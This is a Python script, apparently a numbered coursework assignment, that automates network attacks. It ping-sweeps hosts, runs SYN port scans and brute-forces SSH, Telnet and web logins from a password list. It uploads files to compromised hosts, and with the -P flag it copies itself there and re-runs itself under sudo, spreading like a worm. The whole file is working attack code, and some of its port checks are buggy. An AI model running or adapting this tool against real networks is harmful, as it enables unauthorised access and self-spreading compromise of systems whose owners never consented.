#!/usr/bin/env python3

# The net_attack.py script will automate the process of discovering weak usernames and passwords
# being used for services running on a host. The script will read a file containing a list of IP addresses.
# For each IP address in the list the script will scan the ports on that host, and attempt to bruteforce
# the login for detected services.

# importing all modules necessary to run this script
# ensure that all modules are installed before running script

import argparse
from scapy.all import IP, ICMP, srloop, sr1, TCP, RandShort
from telnetlib import Telnet
from ftplib import FTP
from paramiko import SSHClient, AutoAddPolicy
import requests
import psutil
from colorama import Fore, init, Style

init()

# Part 1 (Set up)
# obtaining parameters using argparse
parser = argparse.ArgumentParser()

parser.add_argument("-t", dest="ipfile",
                    help="Filename for a file containing a list of IP addresses", required=False)
parser.add_argument("-p", dest="ports",
                    help="Ports to scan on the target host", required=False)
parser.add_argument("-u", dest="username",
                    help="A username", type=str, required=False)
parser.add_argument("-f", dest="passfile",
                    help="Filename for a file containing a list of passwords", required=False)
parser.add_argument("-d", dest="deploy",
                    help="File to deploy on target machine", required=False)
parser.add_argument("-L", dest="local", help="Local scan",
                    action="store_true", required=False)
parser.add_argument("-P", dest="propagate", help="Propagate",
                    action="store_true", required=False)

args = parser.parse_args()

# main function
def main():
    # save the list of ports supplied by the user into a list separated on comma
    list_of_ports = list(args.ports.split(","))
    # if the -L parameter is supplied, this code block is executed
    if args.local:
        # obtain the network interfaces on the device with their corresponding IP addresses
        get_ips = get_network_interfaces()
        alive_hosts = list()
        if len(get_ips) > 0:
            # convert obtained IP address to a network address
            for ip in get_ips:
                network_address = ".".join(ip.split(".")[0:3])

                # ping each possible host in the /24 network
                for host in range(0, 256):
                    c_ip = f"{network_address}.{host}"

                    # check if the host is alive
                    check_host = is_reachable(c_ip)

                    # if the host is alive, add it to the alive_hosts list
                    if check_host:
                        alive_hosts.append(c_ip)

        if len(alive_hosts) > 0:
            print(Fore.GREEN + str(alive_hosts) + Style.RESET_ALL)
            print(Fore.WHITE + "Checking ports on alive hosts" + Style.RESET_ALL)

            # scan each host for the list of ports provided
            for host in alive_hosts:
                for port in list_of_ports:
                    check = scan_port(host, int(port))
                    if check:
                        print(Fore.CYAN +
                              f"Port {port} is open" + Style.RESET_ALL)
                        if (int(port) == 22 or 23 or 80 or 8080 or 8888):
                            determine_brute(host, int(port))
                    else:
                        print(
                            Fore.RED + f"Port {port} is closed" + Style.RESET_ALL)
    else:
        # if -t option is used, this code block is executed
        # read in the content of the supplied file
        list_of_ips = read_ip_list(args.ipfile)

        print(Fore.WHITE + "Checking ports on alive hosts" + Style.RESET_ALL)

        # check if the IP is alive
        # if the IP does not respond it is removed from the list
        for ip in list_of_ips:
            check = is_reachable(ip)
            if check:
                continue
            else:
                list_of_ips.remove(ip)

        print(Fore.GREEN + str(list_of_ips) + Style.RESET_ALL)

        # scan for open ports provided by the user on the alive hosts
        for ip in list_of_ips:
            print(Fore.BLUE + f"Scanning ports on {ip}" + Style.RESET_ALL)
            for port in list_of_ports:
                check = scan_port(ip, int(port))
                if check:
                    print(Fore.BLUE + f"Port {port} is open" + Style.RESET_ALL)
                    if (int(port) == 22 or 23 or 80 or 8080 or 8888):
                        determine_brute(ip, int(port))
                else:
                    print(
                        Fore.RED + f"Port {port} is closed" + Style.RESET_ALL)

# help function
def help():
    parser.print_help()


#Part 2 (Read IP Addresses)
def read_ip_list(ip_file):
    # given an input file, this function makes the content of the file into a list

    ip_list = list()  # a list to hold the content of the input file
    with open(ip_file, "r") as ipfile:
        for line in ipfile:
            # add each line in file to the ip_list list
            ip_list.append(line.strip())

    return ip_list  # return the list object to the calling function


# Verify 3 0 Verify Connectivity
def is_reachable(ip):
    # given an IP address, this function checks if the IP responds to a ping request
    print(Fore.CYAN + f"Sending ping request to {ip}" + Style.RESET_ALL)
    ping = IP(dst=f"{ip}")/ICMP()  # ICMP request crafted using Scapy
    response, packetlist = srloop(ping, count=1, verbose=0)  # packet sent

    if response:
        return True  # if a response is obtained, return True to show the IP is alive
    else:
        return False  # if no response is obtained, return False to show the IP is dead

# Part 4 - Port Scan
def scan_port(ip, port):
    # given an IP and a port number, check if the port is listening on the IP

    src_port = RandShort()  # generated a random port to use a sending source port

    tcp_syn_scan = sr1(IP(dst=ip)/TCP(sport=src_port,
                       dport=port, flags="S"), timeout=10, verbose=0)  # craft a TCP SYN scan with Scapy

    if (str(type(tcp_syn_scan)) == "<class 'NoneType'>"):
        return False  # if no response is obtained, it is assumed that the port is closed and False is returned to the calling function
    elif (tcp_syn_scan.haslayer(TCP)):
        if (tcp_syn_scan.getlayer(TCP).flags == 0x12):
            return True  # code 0x12 shows the port is open, return True to the calling function to show that
        elif (tcp_syn_scan.getlayer(TCP).flags == 0x14):
            return False  # code 0x14 shows the port is closed, return False to the calling function to show that

# Part 5 (Bruteforce Telnet)
def bruteforce_telnet(ip, port, username, password_list_filename):
    # given an IP address, port username and password file, this function tries to obtain
    # a set of working credentials by testing the username against all passwords in the supplied file again the Telnet service

    try:
        # this will hold the value of the obtained credentials. If none is found, an empty string is returned
        obtained_creds = ""
        with open(password_list_filename, "r") as passwords:
            for password in passwords:
                password = password.strip()

                print(
                    Fore.CYAN + f"Brute forcing telnet with - {username}:{password}" + Style.RESET_ALL)

                # connection to the telnet server with the username and current password in file
                connection = Telnet(ip, int(port))
                connection.read_until(b"login: ")
                connection.write(username.encode('ascii') + b"\n")

                connection.read_until(b"Password: ")
                connection.write(password.encode('ascii') + b"\n")

                response = connection.read_until(b"login: ")
                connection.close()

                if b"Login incorrect" in response:
                    continue  # incorrect combination, continue brute forcing
                else:
                    obtained_creds = {
                        "username": username,
                        "password": password
                    }

                    break  # valid credentials found, break out of the for loop and move to the next instruction

        # return the value of the obtained_creds variable to the calling function
        return obtained_creds

    except Exception as e:
        print(Fore.RED + f"An error occurred - {str(e)}" + Style.RESET_ALL)

# Part 6 (Bruteforce SSH)
def bruteforce_ssh(ip, port, username, password_list_filename):
    # given an IP address, port username and password file, this function tries to obtain
    # a set of working credentials by testing the username against all passwords in the supplied file against the SSH service

    try:
        # this will hold the value of the obtained credentials. If none is found, an empty string is returned
        obtained_creds = ""

        with open(password_list_filename, "r") as passwords:
            for password in passwords:
                password = password.strip()

                print(
                    Fore.CYAN + f"Brute forcing SSH with - {username}:{password}" + Style.RESET_ALL)

                # connection to the SSH server with the username and current password in file
                ssh_client = SSHClient()
                ssh_client.set_missing_host_key_policy(AutoAddPolicy())

                try:
                    ssh_client.connect(ip, port=int(
                        port), username=username, password=password)  # connect to the server with the supplied username and password

                    obtained_creds = {
                        "username": username,
                        "password": password
                    }

                    break  # valid credentials found, break out of the for loop and move to the next instruction

                except Exception as e:
                    continue  # incorrect combination, continue brute forcing

        # return the value of the obtained_creds variable to the calling function
        return obtained_creds

    except Exception as e:
        print(Fore.RED + f"An error occurred - {str(e)}" + Style.RESET_ALL)

# Part 7 (Bruteforce web login)
def bruteforce_web(ip, port, username, password_list_filename):
    # given an IP address, port username and password file, this function tries to obtain
    # a set of working credentials by testing the username against all passwords in the supplied file against the HTTP service
    try:
        # this will hold the value of the obtained credentials. If none is found, an empty string is returned
        obtained_creds = ""

        # constructing a URL based on the IP address and port
        base_url = f"http://{ip}:{int(port)}"
        get_page = requests.get(base_url)  # GET request sent to the URL
        if get_page.status_code == 200:  # Status code 200 shows that the URL is alive, so it is safe to proceed
            # try to access login.php endpoint
            login_url = f"{base_url}/login.php"
            # GET request to the login URL
            get_login_page = requests.get(login_url)

            if get_login_page.status_code == 200:  # Status code 200 shows the URL is alive, so it is safe to procced
                with open(password_list_filename, "r") as passwords:
                    for password in passwords:
                        password = password.strip()

                        print(
                            Fore.CYAN + f"Brute forcing web login with - {username}:{password}" + Style.RESET_ALL)

                        data = {
                            "username": username,
                            "password": password
                        }

                        # attempt to login using the username and password combination via POST request
                        post_data = requests.post(
                            login_url, data=data, verify=False, allow_redirects=False)

                        if post_data.status_code == 302:  # on successful login, it is assumed that the application redirects the user to a different page, hence 302 is considered a successful status code
                            obtained_creds = {
                                "username": username,
                                "password": password
                            }

                            break  # valid credentials found, break out of the for loop and move to the next instruction
                        else:
                            continue  # incorrect combination, continue brute forcing

        # return the value of the obtained_creds variable to the calling function
        return obtained_creds

    except Exception as e:
        print(Fore.RED + f"An error occurred - {str(e)}" + Style.RESET_ALL)

# Part 8 (Deploying files)
def deploy_via_telnet(ip, username, password, file):
    # given an IP address, username, password and file, this function attempts to upload the file to the target server
    # since file upload cannot be done traditionally in Telnet, the upload is attempted using either the FTP service or the SSH service if available

    # obtain the file name, useful when a filepath is specified
    filename = file.split("/")[-1]
    port_21 = scan_port(ip, 21)  # check if port 21 is listening on the target
    if port_21:  # if port 21 is open, connect to the FTP server and upload file
        try:
            conn = FTP(ip, user=username, passwd=password)
            open_file = open(file, "rb")
            conn.storbinary(f'STOR {filename}', file)
            open_file.close()
            conn.quit()

            print(
                Fore.GREEN + f"File has been uploaded to ~/{filename} via FTP" + Style.RESET_ALL)

        except Exception as e:
            print(f"An error occurred - {str(e)}")

    else:
        # check if port 22 is listening on the target
        port_22 = scan_port(ip, 22)
        if port_22:  # if port 22 is open, connect via SSH and upload file to the user's home directory
            deploy_via_ssh(ip, username, password, file)

        else:
            print(
                Fore.RED + "We could not find a suitable way to transfer the file" + Style.RESET_ALL)


def deploy_via_ssh(ip, username, password, file):
    # given an IP address, username, password and file, this function attempts to upload the file to the target server via SSH

    # obtain the file name, useful when a filepath is specified
    filename = file.split("/")[-1]

    # connect to the SSH server with the provided credentials and upload file to the user's home directory
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    # connect to the server with the supplied username and password
    ssh_client.connect(ip, username=username, password=password)

    uploader = ssh_client.open_sftp()
    try:
        uploader.put(file, f"/home/{username}/{filename}")
        uploader.close()

        print(
            Fore.GREEN + f"File has been uploaded to /home/{username}/{filename} via SSH" + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"An error occurred - {str(e)}" + Style.RESET_ALL)


# Part of part 9
def get_network_interfaces():
    # this function is called when -L is supplied as a parameter
    # it obtains all available interfaces on the device as well as the corresponding IP address

    network_ips = list()

    for nic, addresses in psutil.net_if_addrs().items():
        for address in addresses:
            address = address.address
            try:
                # in order to ensure that the IP address is IPv4, it is validated using the validate_ip_address function
                validate = validate_ip_address(address)

                if validate:
                    print(Fore.CYAN + f"{nic}: {address}" + Style.RESET_ALL)
                    network_ips.append(address)

            except:
                continue

    return network_ips  # return only IPv4 address of interfaces to the calling function


# Part of Part 9
def validate_ip_address(ip_address):
    # given an IP address, this function validates it is a valid IPv4 address

    ip = ip_address.split(".")
    if len(ip) != 4:
        return False

    for i in ip:
        if not i.isdigit():
            return False
        a = int(i)
        if a < 0 or a > 255:
            return False

    return True

# Calling function for Part 5, 6 and 7
def determine_brute(ip, port):
    # this function determines which serivice to brute force based on the port number

    if (int(port) == 22):  # start SSH brute force
        print(Fore.WHITE + "Starting brute force attempt on port 22" + Style.RESET_ALL)
        obtained_creds = bruteforce_ssh(
            ip, port, args.username, args.passfile)

        if obtained_creds:
            print(
                Fore.WHITE + "----------------------------------------------------------" + Style.RESET_ALL)
            print(
                Fore.GREEN + "Hooray. We found a working credential. See below" + Style.RESET_ALL)
            print(Fore.GREEN + f"{obtained_creds}" + Style.RESET_ALL)
            print(
                Fore.WHITE + "----------------------------------------------------------" + Style.RESET_ALL)
            if args.propagate:  # the -P parameter is supplied
                check_if_file_exists(
                    ip, 22, obtained_creds["username"], obtained_creds["password"], parser.prog)
            else:
                if args.deploy:  # the -d parameter is supplied
                    deploy_via_ssh(
                        ip, obtained_creds["username"], obtained_creds["password"], args.deploy)
        else:
            print("")
    elif (int(port) == 23):  # start Telnet brute force
        print("Starting brute force attempt on port 23")
        obtained_creds = bruteforce_telnet(
            ip, port, args.username, args.passfile)

        if obtained_creds:
            print(
                Fore.WHITE + "----------------------------------------------------------" + Style.RESET_ALL)
            print(
                Fore.GREEN + "Hooray. We found a working credential. See below" + Style.RESET_ALL)
            print(Fore.GREEN + f"{obtained_creds}" + Style.RESET_ALL)
            print(
                Fore.WHITE + "----------------------------------------------------------" + Style.RESET_ALL)
            if args.propagate:  # the -P parameter is supplied
                check_if_file_exists(
                    ip, 21, obtained_creds["username"], obtained_creds["password"], parser.prog)
            else:
                if args.deploy:  # the -d parameter is supplied
                    deploy_via_telnet(
                        ip, obtained_creds["username"], obtained_creds["password"], args.deploy)
        else:
            print("")

    elif (int(port) == 80 or 8080 or 8888):  # start web login brute force
        print(f"Starting brute force attempt on port {port}")
        obtained_creds = bruteforce_web(
            ip, port, args.username, args.passfile)

        if obtained_creds:
            print(
                Fore.WHITE + "----------------------------------------------------------" + Style.RESET_ALL)
            print(
                Fore.GREEN + "Hooray. We found a working credential. See below" + Style.RESET_ALL)
            print(Fore.GREEN + f"{obtained_creds}" + Style.RESET_ALL)
            print(
                Fore.WHITE + "----------------------------------------------------------" + Style.RESET_ALL)
        else:
            print("")


# Part of Part 9
def check_if_file_exists(ip, running_port, username, password, file):
    # given a adequate parameters, this function checks if a file exists on the remote server or not
    # if it does not, then it will be uploaded

    filename = file.split("/")[-1]

    command = f"cat /home/{username}/{filename}"

    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())

    # connect to the server with the supplied username and password
    ssh_client.connect(ip, username=username, password=password)

    # execute provided command on the remote target after successful connection
    _stdin, _stdout, _stderr = ssh_client.exec_command(command)

    if _stdout:
        if _stdout.read().decode():
            print(Fore.CYAN +
                  f"{parser.prog} seems to exist on target" + Style.RESET_ALL)

            if running_port == 21:
                deploy_via_telnet(ip, username, password, args.passfile)

            elif running_port == 22:
                deploy_via_ssh(ip, username, password, args.passfile)

            run_file_on_target(ip, username, password)

        else:
            print(Fore.BLUE + f"Uploading {file} to target" + Style.RESET_ALL)
            if running_port == 21:
                deploy_via_telnet(ip, username, password, file)
                deploy_via_telnet(ip, username, password, args.passfile)

                run_file_on_target(ip, username, password)

            elif running_port == 22:
                deploy_via_ssh(ip, username, password, file)
                deploy_via_ssh(ip, username, password, args.passfile)

                run_file_on_target(ip, username, password)

    elif _stderr:
        print(Fore.RED + _stderr.read() + Style.RESET_ALL)

# Part of Part 9 (Self-Propagation)
def run_file_on_target(ip, username, password):
    # this function with run the specified command on the remote target after successful connection

    command = f"sudo python3 {parser.prog} -L -p {args.ports} -u {username} -f {args.passfile} -P"

    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    ssh_client.connect(ip, username=username, password=password)

    # execute provided command on the remote target after successful connection
    _stdin, _stdout, _stderr = ssh_client.exec_command(command)

    if _stdout.read():
        print(Fore.WHITE + _stdout.read().decode() + Style.RESET_ALL)

    elif _stderr.read():
        print(Fore.RED + _stderr.read().decode() + Style.RESET_ALL)


if __name__ == "__main__":
    main()  # call the main function
